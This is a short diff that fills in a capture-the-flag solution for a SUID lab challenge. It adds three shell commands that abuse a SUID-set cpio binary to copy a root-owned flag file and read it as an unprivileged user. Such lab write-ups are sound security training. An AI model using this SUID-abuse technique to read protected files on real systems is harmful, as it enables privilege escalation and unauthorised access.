@@ -14,4 +14,6 @@ this challenge container to make sure that I set the SUID bit on /usr/bin/cpio!
 
 //SOLUZIONE
 
-TODO
+hacker@babysuid_level22:~$ find / -maxdepth 1 -name flag | cpio -ov > /home/hacker/flag.cpio
+hacker@babysuid_level22:~$ cpio -iR hacker -F ./flag.cpio --no-absolute-filenames
+hacker@babysuid_level22:~$ cat flag
